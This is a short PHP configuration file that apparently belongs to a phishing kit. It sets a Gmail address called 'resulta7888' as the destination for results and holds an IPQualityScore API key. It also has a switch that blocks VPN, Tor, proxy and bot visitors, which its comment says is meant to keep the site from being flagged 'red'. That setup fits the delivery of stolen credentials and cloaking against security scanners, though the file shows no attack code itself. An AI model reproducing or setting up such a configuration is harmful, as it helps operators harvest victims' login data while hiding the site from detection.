<?php

$Mail="resulta7888@gmail.com" ;



$API_IQS ='U9MTwGDBKRCRV4aFtVmbKbj6lz' ; /// API IP QUALITY SCORE https://www.ipqualityscore.com/ when u enable security to prevent red site .

$security=false ;  //  true or false   // Enable to active security block VPN , TOR , Proxy , Bad IP and bot 




?>